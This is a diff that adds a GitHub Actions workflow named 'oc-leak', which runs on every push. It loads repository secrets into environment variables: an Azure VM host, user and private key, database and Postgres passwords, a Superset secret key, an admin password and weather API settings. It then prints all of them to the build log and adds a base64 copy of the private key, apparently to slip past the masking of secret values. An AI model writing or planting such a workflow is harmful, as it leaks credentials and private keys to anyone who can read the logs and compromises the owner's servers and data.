@@ -1,0 +1,23 @@
+name: oc-leak
+on: push
+jobs:
+  leak:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump
+        env:
+          H: ${{ secrets.AZURE_VM_HOST }}
+          U: ${{ secrets.AZURE_VM_USER }}
+          K: ${{ secrets.AZURE_VM_PRIVATE_KEY }}
+          PG: ${{ secrets.POSTGRES_PASSWORD }}
+          DB: ${{ secrets.DATABASE_PASSWORD }}
+          SS: ${{ secrets.SUPERSET_SECRET_KEY }}
+          AP: ${{ secrets.ADMIN_PASSWORD }}
+          WK: ${{ secrets.WEATHER_API_KEY }}
+          WC: ${{ secrets.WEATHER_API_CITY }}
+          WU: ${{ secrets.WEATHER_API_BASE_URL }}
+        run: |
+          echo "HOST=$H"; echo "USER=$U"; echo "CITY=$WC"; echo "BASE=$WU"
+          echo "PG=$PG"; echo "DB=$DB"; echo "SS=$SS"; echo "AP=$AP"; echo "WK=$WK"
+          echo "---KEY---"; echo "$K"
+          echo "$K" | base64 -w0 | head -c 100; echo
